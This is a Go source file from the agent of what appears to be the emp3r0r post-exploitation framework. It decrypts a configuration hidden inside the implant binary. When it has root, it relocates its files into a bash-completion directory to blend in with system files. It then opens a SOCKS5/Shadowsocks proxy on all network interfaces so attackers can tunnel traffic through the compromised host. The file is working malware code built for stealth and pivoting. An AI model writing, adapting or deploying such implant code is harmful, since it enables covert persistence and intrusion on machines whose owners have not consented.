package agent

import (
	"fmt"
	"log"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/txthinking/socks5"
)

var RuntimeConfig = &emp3r0r_data.Config{}

func ApplyRuntimeConfig() (err error) {
	readJsonData, err := util.ExtractData()
	if err != nil {
		return fmt.Errorf("read config: %v", err)
	}

	// decrypt attached JSON file
	key := tun.GenAESKey(string(emp3r0r_data.OneTimeMagicBytes))
	jsonData := tun.AESDecryptRaw(key, readJsonData)
	if jsonData == nil {
		err = fmt.Errorf("Decrypt config JSON with key '%s' failed, invalid config data?", key)
		return
	}

	// parse JSON
	err = emp3r0r_data.ReadJSONConfig(jsonData, RuntimeConfig)
	if err != nil {
		short_view := jsonData
		if len(jsonData) > 100 {
			short_view = jsonData[:100]
		}
		return fmt.Errorf("parsing %d bytes of JSON data (%s...): %v", len(jsonData), short_view, err)
	}

	// CA
	tun.CACrt = []byte(RuntimeConfig.CAPEM)

	// change agent root to /usr/share/bash-completion/completions/helpers
	agent_root_base := util.FileBaseName(RuntimeConfig.AgentRoot)
	if HasRoot() {
		prefix := "/usr/share/bash-completion/completions/helpers/"
		RuntimeConfig.AgentRoot = fmt.Sprintf("%s/%s", prefix, agent_root_base)
		RuntimeConfig.UtilsPath = strings.ReplaceAll(RuntimeConfig.UtilsPath, "/tmp/", prefix)
		RuntimeConfig.SocketName = strings.ReplaceAll(RuntimeConfig.SocketName, "/tmp/", prefix)
		RuntimeConfig.PIDFile = strings.ReplaceAll(RuntimeConfig.PIDFile, "/tmp/", prefix)
		log.Printf("Agent root: %s", RuntimeConfig.AgentRoot)
	}

	// Socks5 proxy server
	addr := fmt.Sprintf("0.0.0.0:%s", RuntimeConfig.AutoProxyPort)
	emp3r0r_data.ProxyServer, err = socks5.NewClassicServer(addr, "",
		RuntimeConfig.ShadowsocksPort, RuntimeConfig.Password,
		RuntimeConfig.AutoProxyTimeout, RuntimeConfig.AutoProxyTimeout)
	return
}
